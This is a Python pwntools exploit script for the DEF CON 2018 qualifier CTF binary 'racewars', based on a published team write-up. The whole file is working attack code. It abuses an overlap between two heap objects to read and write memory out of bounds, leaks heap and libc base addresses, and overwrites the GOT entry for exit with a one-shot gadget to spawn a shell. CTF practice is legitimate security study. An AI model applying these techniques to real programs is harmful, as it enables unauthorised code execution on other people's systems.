# This exploit is based off of: https://github.com/balsn/ctf_writeup/tree/master/20180512-defconctfqual#race-wars

from pwn import *

# Specify the target process. binary, and libc file
target = process('racewars', env = {"LD_PRELOAD":"./libc-2.23.so"})
gdb.attach(target)

elf = ELF('racewars')
libc = ELF('libc-2.23.so')

# These are four functions to deal with ordering new parts
def pickTires(pairs):
	target.sendline("1")
	print target.recvuntil("need?")
	target.sendline(str(pairs))

def pickChassis():
	target.sendline("2")
	print target.recvuntil("chassis...")
	target.sendline("2")
	print target.recvuntil("jetta")

def pickEngine():
	target.sendline("3")
	print target.recvuntil("jetta is the 2L")

def pickTransmission(gear):
	target.sendline("4")
	print target.recvuntil("transmission?")
	target.sendline(str(gear))

# These are two functions that deal with editing tires and the transmission
def editTires(qt, aspect):
	target.sendline("1")
	print target.recvuntil("what?")
	target.sendline(str(aspect))
	print target.recvuntil("new") 
	target.sendline(str(qt))

def editTransmission(modify, setVal, write):
	target.sendline("4")
	print target.recvuntil("modify?")
	target.sendline(str(modify))
	print target.recvuntil(" is ")
	leak = target.recvuntil(", modify")
	print "leak is: " + leak
	leak = leak.replace(", modify", "")
	target.sendline(str(setVal))
	print target.recvuntil("(1 = yes, 0 = no)")
	target.sendline(str(write))
	return int(leak)

# This is a function to just call `exit` for after the got write, by ordering 1 tire pairs
def buyNewTires():
	target.sendline("5")
	print target.recvuntil("CHOICE: ")
	target.sendline("1")
	print target.recvuntil("need?")
	target.sendline("1")

# This function will leak the heap, after the transmssion limit overwrite
def leakHeap():
	leak = ""
	for i in xrange(8):
		leak += chr(editTransmission(0xffffffffffffff70 + i, 0x1, 0x0))	
	leak = u64(leak)
	heapBase = leak - 0xe0
	print "heap base is: " + hex(heapBase)
	return heapBase

# This function will leak the heap, after the transmssion limit overwrite
def leakLibc(heapBase):
	print "leaking libc"
	leakAdr = ((elf.got['puts'] - heapBase) - 0xa0) & 0xffffffffffffffff
	leak = ""
	for i in xrange(8):
		leak += chr(editTransmission(leakAdr + i, 0x1, 0x0))
	leak = u64(leak)
	libcBase = leak - libc.symbols["puts"]
	print "libc base is: " + hex(leak) 
	return libcBase

# This function will write the oneshot gadget, using the heap and libc base addresse
def writeOneShot(libcBase, heapBase):
	oneShot = libcBase + 0xf1147
	leakAdr = (elf.got['exit'] - heapBase - 0xa0) & 0xffffffffffffffff
	for i in xrange(8):
		editTransmission(leakAdr + i, ord(p64(oneShot)[i]), 0x1)
	print "oneshot: " + hex(libcBase + 0xf1147)

# First exploit the bug, and make the tires and transmission data overlap
pickTires(0x8000000)
pickTransmission(1)
pickChassis()
pickEngine()

# Edit the tires, to overwrite the max distance we can write with 0xffffffffffffffff
editTires(0xffff, 1)
editTires(0xffff, 2)
editTires(0xffff, 3)
editTires(0xffff, 4)

# Leak a heap pointer and calculate the heap base
# Use the heap base to leak a libc pointer, and get the libc base
heapAdr = leakHeap()
libcAdr = leakLibc(heapAdr)

# Use the heap and libc base addresses to write the oneshot gadget to the got address of exit
writeOneShot(libcAdr, heapAdr)

# Trigger the oneshot gadget by getting exit called, by buying 1 new tire pair 
buyNewTires()

# Drop to an interactive shell
target.interactive()
